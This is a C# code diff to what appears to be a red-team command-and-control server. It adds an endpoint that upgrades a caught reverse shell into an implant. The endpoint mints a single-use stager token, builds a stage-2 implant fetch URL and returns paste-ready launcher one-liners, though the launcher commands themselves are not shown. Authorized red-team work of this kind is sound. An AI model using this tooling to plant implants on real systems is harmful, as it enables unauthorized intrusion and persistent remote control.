@@ -4,8 +4,10 @@ using Microsoft.AspNetCore.Http;
 using Microsoft.AspNetCore.Routing;
 using Rod.Audit;
 using Rod.CoreState;
+using Rod.CoreState.Listeners;
 using Rod.CoreState.Operators;
 using Rod.CoreState.ShellSessions;
+using Rod.CoreState.Staging;
 using Rod.Transport.Listeners.ShellCatch;
 
 namespace Rod.Transport.Endpoints;
@@ -42,6 +44,7 @@ public static class ShellSessionEndpoints
         group.MapGet("/{id}/output", ReadOutputAsync).WithName(nameof(ReadOutputAsync));
         group.MapPost("/{id}:input", SendInputAsync).WithName(nameof(SendInputAsync));
         group.MapPost("/{id}:close", CloseShellAsync).WithName(nameof(CloseShellAsync));
+        group.MapPost("/{id}:upgrade", UpgradeAsync).WithName(nameof(UpgradeAsync));
 
         return endpoints;
     }
@@ -218,6 +221,104 @@ public static class ShellSessionEndpoints
         return Results.Accepted();
     }
 
+    // The upgrade render (architecture.md Sec 5.2, Sec 6, Sec 8): a caught
+    // shell is anonymous and unenrolled, and its value ends where a real
+    // implant begins. The render is deliberately advisory -- the endpoint
+    // mints the deployment credential and hands back the one-liners for the
+    // operator to paste into the shell, rather than the server writing into
+    // the session's input: the paste is an operator action through the
+    // audited input route, and every launcher is the standard
+    // fetch-verify-run stager shape the stage-2 fetch already defines.
+    private static async Task<IResult> UpgradeAsync(
+        string engagementId,
+        string id,
+        ShellUpgradeRequest? body,
+        ClaimsPrincipal user,
+        IShellSessionRegistry sessions,
+        IListenerStore listenerStore,
+        IPayloadStore payloads,
+        IStagerTokenService tokens,
+        IAuditStore audit,
+        TimeProvider clock,
+        CancellationToken cancellationToken)
+    {
+        var (failure, scope) = await ResolveScopedShellAsync(
+            engagementId, id, sessions, cancellationToken);
+        if (scope is null)
+            return failure!;
+
+        var operatorId = user.TryGetOperatorId();
+        if (operatorId is null)
+            return Results.Unauthorized();
+
+        // The stage-2 fetch rides the engagement's web listeners, so the
+        // URL needs one to exist. Prefer the hardened members when several
+        // are bound; any web front serves the route.
+        var webListener = (await listenerStore.ListAsync(cancellationToken))
+            .Where(l => l.EngagementId == scope.Engagement && IsWebTransport(l.Transport))
+            .OrderByDescending(l => l.Transport == "https")
+            .ThenByDescending(l => l.Transport == "mtls")
+            .ThenBy(l => l.CreatedAt)
+            .FirstOrDefault();
+        if (webListener is null)
+            return Results.BadRequest(new Problem(
+                "The engagement has no HTTP(S) listener to serve the stage-2 fetch; create one first."));
+
+        // The payload to grow into: the operator names one, or the newest
+        // build in the engagement stands in.
+        var payload = await ResolvePayloadAsync(payloads, scope.Engagement, body?.PayloadId, cancellationToken);
+        if (payload is null)
+            return Results.BadRequest(new Problem(
+                "No stage-2 payload exists in this engagement; build one first, or name an existing payload id."));
+
+        // One deployment credential for the paste: single-use (the fetch
+        // verifies it, the enrollment spends it) and short-lived.
+        var at = clock.GetUtcNow();
+        var token = await tokens.MintAsync(
+            scope.Engagement, operatorId.Value, at,
+            maxUses: 1, lifetime: TimeSpan.FromMinutes(30), cancellationToken);
+        await audit.AppendAsync(
+            AuditEvent.Fact(
+                eventId: Guid.NewGuid(),
+                engagementId: scope.Engagement.Value,
+                operatorId: operatorId.Value.Value,
+                implantId: Guid.Empty,
+                taskId: Guid.Empty,
+                verb: "mint-stager-token",
+                kind: AuditEventKind.StagerTokenMinted,
+                payload: $"origin=shell-upgrade shell={scope.Session.Id} uses=1 lifetime=30m",
+                output: null,
+                outcome: token.Id.ToString(),
+                at),
+            cancellationToken);
+
+        var url = $"{webListener.PublicEndpoint.TrimEnd('/')}/implants/stage2/{payload.PayloadId:N}";
+        return Results.Ok(new ShellUpgradeResponse(
+            payload.PayloadId.ToString("N"),
+            url,
+            token.Secret,
+            token.ExpiresAt,
+            ShellUpgradeLaunchers.Render(url, token.Secret)
+                .Select(l => new ShellLauncherResponse(l.Id, l.Os, l.Command))
+                .ToArray()));
+    }
+
+    private static bool IsWebTransport(string transport)
+        => transport is "http" or "https" or "mtls";
+
+    private static async Task<PayloadRecord?> ResolvePayloadAsync(
+        IPayloadStore payloads,
+        EngagementId engagement,
+        string? payloadId,
+        CancellationToken cancellationToken)
+    {
+        if (!string.IsNullOrWhiteSpace(payloadId) && Guid.TryParse(payloadId, out var named))
+            return await payloads.FindAsync(named, engagement.Value, cancellationToken);
+
+        var newest = await payloads.ListAsync(engagement.Value, cancellationToken);
+        return newest.OrderByDescending(p => p.BuiltAt).FirstOrDefault();
+    }
+
     // Resolves the scoped shell: the engagement in the path must own the
     // session, so a foreign engagement's id is indistinguishable from an
     // unknown one (the same construction every scoped surface follows).
@@ -272,6 +373,28 @@ public static class ShellSessionEndpoints
 
     private sealed record ShellChunkResponse(long Sequence, DateTimeOffset At, string Text);
 }
+
+/// <summary>
+/// Names the stage-2 payload a shell should grow into; omitted, the
+/// engagement's newest build stands in.
+/// </summary>
+public sealed record ShellUpgradeRequest(string? PayloadId);
+
+/// <summary>
+/// The rendered upgrade for one caught shell: the stage-2 fetch URL, the
+/// single-use deployment credential it carries, and the paste-ready
+/// one-liners per downloader family. The secret rides here exactly once --
+/// on the operator answer -- and never on the audit trail.
+/// </summary>
+public sealed record ShellUpgradeResponse(
+    string PayloadId,
+    string Url,
+    string TokenSecret,
+    DateTimeOffset TokenExpiresAt,
+    IReadOnlyList<ShellLauncherResponse> Launchers);
+
+/// <summary>One paste-ready launcher, named for the surface it is pasted into.</summary>
+public sealed record ShellLauncherResponse(string Id, string Os, string Command);
 
 /// <summary>The submitted input for a caught shell: one line of operator text.</summary>
 public sealed record ShellInputRequest(string Text);
